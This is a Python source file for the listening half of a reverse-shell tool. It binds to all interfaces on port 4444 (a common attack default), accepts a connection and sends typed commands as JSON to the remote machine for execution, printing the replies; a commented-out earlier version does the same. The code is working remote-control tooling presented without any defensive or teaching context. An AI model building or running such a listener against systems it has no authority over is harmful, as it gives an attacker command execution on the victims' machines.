import socket
import json

bufferSz = 1024

class Listener:
    def __init__(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        print("[+] Waiting for connection")
        s.listen(0)
        self.conn, adr = s.accept()
        print("Connection established with", adr[0], str(adr[1]))

    def exCmdRmt(self, cmd):
        # self.conn.send(cmd.encode())
        # return str(self.conn.recv(bufferSz), "utf-8")
        self.json_send(cmd)
        if cmd == "exit":
            self.conn.close()
            exit()
        return self.json_resc()
    
    def json_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())
    
    def json_resc(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(bufferSz).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    
    def run(self):
        while True:
            cmd = input("#$~ ")
            reply = self.exCmdRmt(cmd)
            print(reply)



# def exCmds(s, conn):
#     while True:
#         cwd = s.recv(bufferSz.decode("utf-8"))
#         cmd = input(cwd+"$#> ")
#         if cmd == "quit":
#             conn.close()
#             s.close()
#             sys.exit()
#         elif len(str.encode(cmd)) > 0:
#             conn.send(cmd.encode())
#             rsp = str(conn.recv(bufferSz), "utf-8")
#             print(rsp)


def main():
    host = "0.0.0.0"
    port = 4444
    listInst = Listener(host, port)
    listInst.run()


if __name__ == "__main__":
    main()